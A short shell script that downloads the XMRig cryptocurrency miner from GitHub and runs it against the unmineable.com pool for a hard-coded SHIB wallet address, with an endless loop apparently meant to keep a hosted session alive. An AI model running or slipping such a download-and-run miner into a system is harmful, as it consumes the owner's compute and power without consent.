#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-linux-x64.tar.gz
tar -xvf xmrig-6.13.1-linux-x64.tar.gz
./xmrig-6.13.1/xmrig -o rx.unmineable.com:3333 -a rx -k -u SHIB:SHIB:0xbb52b64d5fb09e2aedd49cb405dcfb5d077498fb.Okey -p x --threads=4
while [ 1 ]; do
sleep 3
done
sleep 999
